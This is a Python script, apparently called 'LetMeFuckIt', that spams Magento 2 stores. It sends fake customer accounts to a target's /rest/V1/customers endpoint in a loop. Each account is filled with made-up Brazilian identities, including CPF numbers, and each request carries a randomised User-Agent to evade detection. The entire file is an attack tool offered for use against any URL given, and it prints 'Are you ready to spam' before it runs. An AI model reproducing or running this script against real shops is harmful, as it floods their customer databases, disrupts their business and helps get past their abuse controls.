#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import argparse
import requests
import random
from faker import Faker
import json

# Required modules:
#
# pip install requests
# pip install random
# pip install Faker
#
###################################################################################################
#Scanner : LetMeFuckIt - Magento 2 - Customer Bot in 06/11/2020
###################################################################################################

print(" __      ______  _________   ___ __ __  ______       ______  __  __  ______  ___   ___      ________  _________  ")
print("/_/\    /_____/\/________/\ /__//_//_/\/_____/\     /_____/\/_/\/_/\/_____/\/___/\/__/\    /_______/\/________/\ ")
print("\:\ \   \::::_\/\__.::.__\/ \::\| \| \ \::::_\/_    \::::_\/\:\ \:\ \:::__\/\::.\ \\ \ \   \__.::._\/\__.::.__\/ ")
print(" \:\ \   \:\/___/\ \::\ \    \:.      \ \:\/___/\    \:\/___/\:\ \:\ \:\ \  _\:: \/_) \ \     \::\ \    \::\ \   ")
print("  \:\ \___\::___\/_ \::\ \    \:.\-/\  \ \::___\/_    \:::._\/\:\ \:\ \:\ \/_/\:. __  ( (     _\::\ \__  \::\ \  ")
print("   \:\/___/\:\____/\ \::\ \    \. \  \  \ \:\____/\    \:\ \   \:\_\:\ \:\_\ \ \: \ )  \ \   /__\::\__/\  \::\ \ ")
print("    \_____\/\_____\/  \__\/     \__\/ \__\/\_____\/     \_\/    \_____\/\_____\/\__\/\__\/   \________\/   \__\/ ")
print("\n\n Welcome to Let me fuck It! \n Customer Bot!\n Help: --h\n")

def executeRequest(target, data, headers, verbose = False):
	r = requests.post("%s/index.php/rest/V1/customers" % target, data=data, headers=headers)
	print(r.status_code, r.reason)
	if(verbose):
		parsed = json.loads(r.content)
		print(json.dumps(parsed, indent=4, sort_keys=True))

def getRandomUserAgent():
	fake = Faker()
	userAgent = fake.user_agent()
	return userAgent

def getRandomCustomerInfo():
	fake = Faker('pt_BR')
	customerInfo = """{"customer": {"email": "%s", "firstname": "%s", "lastname": "%s", "taxvat": "%s", "addresses": [{"defaultShipping": "true", "defaultBilling": "true", "firstname": "%s", "lastname": "%s", "region": {"regionCode": "NY", "region": "New York", "regionId": 43}, "postcode": "%s", "street": ["%s"], "city": "%s", "telephone": "%s", "countryId": "US"}]}, "password": "letmefuckitbro"}""" \
        % (fake.ascii_free_email().encode('utf-8'), fake.first_name().encode('utf-8'), fake.last_name().encode('utf-8'), fake.cpf().encode('utf-8'), fake.first_name().encode('utf-8'), fake.last_name().encode('utf-8'), fake.postcode().encode('utf-8'), fake.street_address().encode('utf-8'), fake.city().encode('utf-8'), fake.phone_number().encode('utf-8'))
	return customerInfo

def main():
	parser = argparse.ArgumentParser(description=' Options:')
	parser.add_argument('--url', help='Target url')
	parser.add_argument('--verbose', help='Enable verbose')
	parser.add_argument('--number', default=1,help='Number of customers')
	args = parser.parse_args()
	if args.url == None:
	    print("\n Usage: python magento-customer-spammer.py --url <url>")
	    exit(1)
	else:
		print("\nAre you ready to spam %s ?" % args.url)
		print("\nCreating random %s customer(s)." % args.number)
		for x in range(int(args.number)):
			try:
				headers = {'User-Agent': getRandomUserAgent(), 'Content-Type': 'application/json'}
				data = getRandomCustomerInfo()
				executeRequest(args.url, data, headers, args.verbose)
			except Exception as err:
				print("Exception occured: %s" % err)
				pass
		

if __name__ == "__main__":
    main()
